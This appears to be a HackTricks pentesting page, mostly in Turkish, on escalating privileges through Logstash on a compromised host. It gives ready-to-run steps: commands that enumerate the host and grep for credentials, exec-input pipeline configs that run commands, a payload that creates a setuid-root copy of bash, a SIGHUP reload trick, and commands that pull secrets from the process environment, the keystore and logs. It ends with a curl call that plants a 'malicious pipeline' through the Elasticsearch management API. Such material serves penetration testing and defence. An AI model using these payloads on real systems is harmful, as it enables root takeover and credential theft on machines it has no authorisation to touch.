# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash, **gather, transform, and dispatch logs** amacıyla **pipelines** adı verilen bir sistem aracılığıyla kullanılır. Bu pipelines, **input**, **filter** ve **output** aşamalarından oluşur. Logstash'ın ele geçirilmiş bir makinede çalışması durumunda ilginç bir durum ortaya çıkar.

### Pipeline Configuration

Pipelines, pipeline yapılandırma dosyalarının konumlarını listeleyen **/etc/logstash/pipelines.yml** dosyasında yapılandırılır:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Bu dosya, pipeline yapılandırmalarını içeren **.conf** dosyalarının nerede bulunduğunu ortaya koyar. Bir **Elasticsearch output module** kullanıldığında, **pipelines** genellikle **Elasticsearch credentials** içerir; bunlar sıklıkla Logstash'ın Elasticsearch'e veri yazma gereksinimi nedeniyle geniş yetkilere sahiptir. Yapılandırma yollarındaki wildcards, Logstash'ın belirtilen dizindeki eşleşen tüm pipelines'ları çalıştırmasına izin verir.

Eğer Logstash `-f <directory>` ile `pipelines.yml` yerine başlatılırsa, **o dizindeki tüm dosyalar leksikografik sırayla birleştirilir ve tek bir config olarak parse edilir**. Bunun iki saldırı odaklı sonucu vardır:

- `000-input.conf` veya `zzz-output.conf` gibi bırakılan bir dosya, final pipeline'ın nasıl oluşturulduğunu değiştirebilir
- Bozuk (malformed) bir dosya tüm pipeline'ın yüklenmesini engelleyebilir; bu yüzden auto-reload'a güvenmeden önce payload'ları dikkatle doğrulayın

### Fast Enumeration on a Compromised Host

Logstash'ın yüklü olduğu bir makinede, hızlıca şunları inceleyin:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Ayrıca yerel izleme API'sinin erişilebilir olup olmadığını kontrol edin. Varsayılan olarak **127.0.0.1:9600** üzerinde bağlanır, bu genellikle host'a eriştikten sonra yeterlidir:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Bu genellikle size pipeline ID'leri, runtime detayları ve değiştirdiğiniz pipeline'ın yüklendiğine dair onay sağlar.

Logstash'tan elde edilen kimlik bilgileri genellikle **Elasticsearch**'e erişim sağlar, bu yüzden [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, önce Logstash servisinin hangi kullanıcı altında çalıştığını belirleyin; genellikle **logstash** kullanıcısıdır. Aşağıdaki kriterlerden **bir**ini karşıladığınızdan emin olun:

- Bir pipeline **.conf** dosyasına **write access** sahibi olmak **veya**
- **/etc/logstash/pipelines.yml** dosyası wildcard kullanıyor ve hedef klasöre yazabiliyorsanız

Ek olarak, aşağıdaki koşullardan **bir**i sağlanmış olmalıdır:

- Logstash servisini yeniden başlatabilme yeteneği **veya**
- **/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarının bulunması

Konfigürasyonda bir wildcard varsa, bu wildcard ile eşleşen bir dosya oluşturmak komut çalıştırmaya izin verir. Örneğin:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Burada, **interval** çalıştırma sıklığını saniye cinsinden belirler. Verilen örnekte, **whoami** komutu her 120 saniyede bir çalışır ve çıktısı **/tmp/output.log** dosyasına yönlendirilir.

**/etc/logstash/logstash.yml** içinde **config.reload.automatic: true** ayarlıysa, Logstash yeni veya değiştirilmiş pipeline yapılandırmalarını yeniden başlatmaya gerek kalmadan otomatik olarak algılar ve uygular. Eğer wildcard yoksa, mevcut yapılandırmalarda yine değişiklik yapılabilir; ancak kesintilerden kaçınmak için dikkatli olunmalıdır.

### More Reliable Pipeline Payloads

`exec` input plugin'i mevcut sürümlerde hala çalışır ve ya bir `interval` ya da bir `schedule` gerektirir. Logstash JVM'sini **forking** yaparak çalıştırır; bu yüzden bellek kısıtlıysa payload'ınız sessizce çalışmak yerine `ENOMEM` ile başarısız olabilir.

Daha pratik bir privilege-escalation payload genellikle kalıcı bir artefakt bırakan türdendir:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Eğer yeniden başlatma yetkiniz yoksa ancak sürece sinyal gönderebiliyorsanız, Logstash Unix-benzeri sistemlerde **SIGHUP** ile tetiklenen bir yeniden yüklemeyi de destekler:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.

### Stealing Secrets from Logstash

Sadece kod yürütmeye odaklanmadan önce, Logstash'in zaten erişimi olan verileri toplayın:

- Düz metin kimlik bilgileri genellikle `elasticsearch {}` çıktıları, `http_poller`, JDBC girdileri veya bulutla ilgili ayarlar içinde sabit kodlanır
- Güvenli ayarlar **`/etc/logstash/logstash.keystore`** içinde veya başka bir `path.settings` dizininde bulunabilir
- Keystore parolası sıklıkla **`LOGSTASH_KEYSTORE_PASS`** aracılığıyla sağlanır ve paket tabanlı kurulumlar genellikle bunu **`/etc/sysconfig/logstash`**'tan alır
- `${VAR}` ile çevresel değişken genişletmesi Logstash başlangıcında çözülür, bu yüzden servisin ortamını incelemeye değer

Yararlı kontroller:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Bunu kontrol etmek de önemlidir çünkü **CVE-2023-46672**, belirli durumlarda Logstash'ın hassas bilgileri loglarda kaydedebileceğini gösterdi. Bir post-exploitation hostunda, eski Logstash logları ve `journald` girdileri, mevcut config gizli bilgileri inline olarak saklamak yerine keystore'u referans gösterse bile kimlik bilgilerini açığa çıkarabilir.

### Merkezi Pipeline Yönetimi İstismarı

Bazı ortamlarda host yerel `.conf` dosyalarına hiç güvenmez. Eğer **`xpack.management.enabled: true`** yapılandırılmışsa, Logstash Elasticsearch/Kibana'dan merkezi olarak yönetilen pipeline'ları çekebilir ve bu modu etkinleştirdikten sonra yerel pipeline konfigürasyonları artık gerçek kaynak olmaz.

Bu farklı bir saldırı yolu demektir:

1. Elastic kimlik bilgilerini yerel Logstash ayarlarından, keystore'dan veya loglardan kurtarın
2. Hesabın **`manage_logstash_pipelines`** cluster yetkisine sahip olup olmadığını doğrulayın
3. Merkezi olarak yönetilen bir pipeline oluşturun veya değiştirin, böylece Logstash hostu bir sonraki poll aralığında payload'unuzu çalıştırır

Bu özellik için kullanılan Elasticsearch API'si şudur:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Bu, yerel dosyalar salt okunur olduğunda ancak Logstash zaten pipeline'ları uzaktan almak üzere kayıtlıysa özellikle faydalıdır.

## Referanslar

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
